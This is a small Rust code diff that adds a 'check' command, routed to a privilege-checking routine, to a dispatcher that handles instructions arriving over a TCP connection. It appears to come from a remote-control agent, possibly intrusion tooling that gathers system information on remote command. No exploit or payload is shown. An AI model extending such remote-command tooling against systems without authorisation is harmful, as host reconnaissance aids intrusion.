@@ -10,6 +10,7 @@ pub fn dispatch(instruct: &str, conn: &mut TcpStream) -> Result<bool, String> {
 
         // System interaction
         "sysinfo" => system::sysinfo(conn),
+        "check" => system::check_privileges(conn),
 
         // No registered command
         _ => Ok(true)
